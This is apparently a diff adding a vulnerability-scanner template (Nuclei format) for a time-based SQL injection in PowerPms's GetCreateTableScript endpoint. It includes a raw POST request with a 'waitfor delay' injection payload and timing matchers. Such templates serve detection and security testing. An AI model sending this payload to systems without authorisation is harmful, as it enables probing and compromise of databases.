@@ -1,0 +1,39 @@
+id: powerpms-GetCreateTableScript-sqli
+info:
+  name: 普华科技PowerPms GetCreateTableScript存在sql注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59503/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,powerpms
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /WebCenter/GetCreateTableScript HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3017.19 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 41
+        Connection: close
+
+        TableName=1%27%3Bwaitfor+delay+%270%3A0%3A5%27--%2B
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
